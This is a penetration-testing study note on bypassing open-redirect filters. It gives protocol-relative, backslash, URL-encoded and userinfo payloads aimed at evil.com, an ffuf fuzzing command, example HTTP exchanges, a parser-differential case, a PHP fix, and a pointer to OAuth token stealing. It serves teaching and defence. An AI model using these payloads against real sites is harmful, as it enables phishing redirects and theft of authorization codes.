---
tags: [vapt, open-redirect, intermediate, bypass]
difficulty: intermediate
module: "24 - Open Redirect"
topic: "24.03 Bypass Techniques (//evil.com, /\\evil.com, ///evil.com)"
---

# 24.03 — Bypass Techniques (`//evil.com`, `/\evil.com`, `///evil.com`)

## What is it?
When developers become aware of Open Redirect vulnerabilities, they often implement flawed, blocklist-based filters. They might check if the parameter starts with `http://` or `https://` and block it, or they might try to enforce that the parameter *must* start with a forward slash `/` (intending to force a relative, local redirect).

Because URL parsing across different browsers and backends is incredibly complex and inconsistent, attackers can use malformed URLs or protocol-relative URLs to bypass these filters. If a filter ensures the URL starts with `/`, the attacker provides `//evil.com`. This is a valid "protocol-relative" URL that instructs the browser to connect to `evil.com` using whatever protocol (HTTP/HTTPS) the current page is using.

Think of it like a bouncer checking your ID. The rule is "You must wear a blue shirt to enter." You wear a jacket over a blue shirt. The bouncer sees blue, lets you in, and then you take the jacket off inside. The filter sees the `/`, allows it, but the browser interprets it as an external domain.

## ASCII Diagram
```text
[Attacker Payload] ──> ?redirect=//evil.com
       │
[Security Filter (Flawed Logic)]
       │
       ├─ Does it start with "http"? NO.
       ├─ Does it start with "/"? YES! (It starts with two, which is >= one).
       ├─ Action: ALLOW.
       │
[HTTP Response]
       │
       ├─ HTTP 302 Found
       ├─ Location: //evil.com
       │
[Victim's Browser]
       │
       ├─ Reads: "//evil.com"
       ├─ Translates to: "https://evil.com" (Protocol-Relative)
       ▼
[evil.com] ─── Redirect Successful! Filter Bypassed!
```

## How to Find It
- **Manual steps:**
  1. Identify a redirect parameter that seems protected. If you send `?next=http://evil.com`, you get an error or a redirect to the home page.
  2. Determine the filter logic. Does it require a `/`? Does it block `http`? Does it require a specific domain name in the string?
  3. Methodically test bypass permutations.
  4. **Protocol Relative:** `//evil.com`
  5. **Backslash Magic (Windows/Chrome trickery):** `/\evil.com` or `\\evil.com`
  6. **URL Encoding:** `%2f%2fevil.com`
  7. **Domain Appending (if it requires the trusted domain):** `https://trusted.com.evil.com` or `https://evil.com/?trusted.com`

- **Tool commands with flags explained:**
  You can automate the fuzzing of bypasses using Burp Intruder with a custom payload list:
  ```bash
  # Use ffuf to rapidly test hundreds of URL parsing quirks
  ffuf -u "https://target.com/login?next=FUZZ" \
       -w /usr/share/seclists/Fuzzing/Open-Redirect-payloads.txt \
       -mr "evil.com"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Trigger the filter to see its failure state (e.g., a 400 Bad Request or a redirect to `/`).
  2. Use `//evil.com`. If the browser redirects to `evil.com`, you've successfully used a protocol-relative bypass.
  3. If that is blocked, try `/\evil.com` or `/\/evil.com`. Many backend regex filters fail to account for backslashes, but modern browsers (like Chrome) will automatically normalize `/\` into `//` and execute the external redirect.
  4. Confirm the bypass in a real browser (Chrome/Firefox/Edge), as `curl` might not follow these malformed redirects the same way a browser does.

- **Actual payloads:**
  **Protocol Relative (Starts with `/`):**
  ```text
  //evil.com
  ///evil.com
  ```
  **Browser Normalization Quirks:**
  ```text
  /\evil.com
  \\evil.com
  /evil.com\
  ```
  **Domain Validation Quirks (If filter expects "trusted.com" to be in the string):**
  ```text
  //trusted.com@evil.com
  https://evil.com/trusted.com
  https://evil.com?trusted.com
  https://trusted.com.evil.com
  ```
  **URL Encoded:**
  ```text
  %09https://evil.com (Tab character bypasses URL parsers)
  %0ahttps://evil.com (Newline character)
  ```

- **Real HTTP request/response examples:**
  **Bypass Request:**
  ```http
  GET /auth?return_to=/\attacker.com HTTP/1.1
  Host: target.com
  ```
  **Bypass Response:**
  ```http
  HTTP/1.1 302 Found
  Location: /\attacker.com
  ```
  *(When Chrome receives `Location: /\attacker.com`, it normalizes it to `//attacker.com` and navigates to the attacker's server).*

## Real-World Example
A Bug Bounty hunter encountered a strict filter on a Node.js application. The developer used the `URL` object in JavaScript to validate the domain: `if (new URL(req.query.url).hostname === "target.com")`. The hunter discovered a parser differential. They sent the payload `https://target.com\@evil.com`. The Node.js URL parser interpreted `target.com` as the hostname and `\@evil.com` as the path (passing the check). However, when the HTTP 302 was sent to the victim's Chrome browser, Chrome interpreted `target.com\` as the username/password and `evil.com` as the hostname. The victim was successfully redirected to `evil.com`.

## How to Fix It
- **Developer remediation:**
  Do not rely on string manipulation, regex, or `startsWith('/')` checks to validate URLs. The only foolproof way to prevent Open Redirects is to strictly compare the requested destination against a hardcoded list of allowed values. 
  
  If dynamic URLs are mandatory, construct the absolute URL securely using a robust library, ensuring the resulting Network Location (hostname) matches your exact domain exactly, and use `strpos` (or equivalent) to explicitly reject the `//` sequence.

- **Code snippet:**
  **PHP (Explicitly blocking Protocol-Relative URLs):**
  ```php
  $redirect_url = $_GET['url'];
  
  // 1. Must start with a single slash (relative path)
  // 2. Must NOT start with two slashes (protocol-relative URL)
  // 3. Must NOT contain backslashes
  if (preg_match('/^\/[^\/\\\\]/', $redirect_url)) {
      header("Location: " . $redirect_url);
      exit;
  } else {
      header("Location: /dashboard");
      exit;
  }
  ```

## Chaining Opportunities
- This vuln + [[02 - SSRF via URL Parsing Quirks]] → The exact same techniques (e.g., `target.com@evil.com`) are used to bypass SSRF filters. If you master URL parsing bypasses for Open Redirects, you master them for SSRF.
- This vuln + [[06 - Open Redirect + OAuth (token stealing)]] → Bypass weak checks on the `redirect_uri` parameter in OAuth flows to steal authorization codes.

## Related Notes
- [[01 - What is Open Redirect?]]
- [[02 - Open Redirect in redirect= and url= Parameters]]
- [[08 - Defense — Allowlist of Redirect Destinations]]
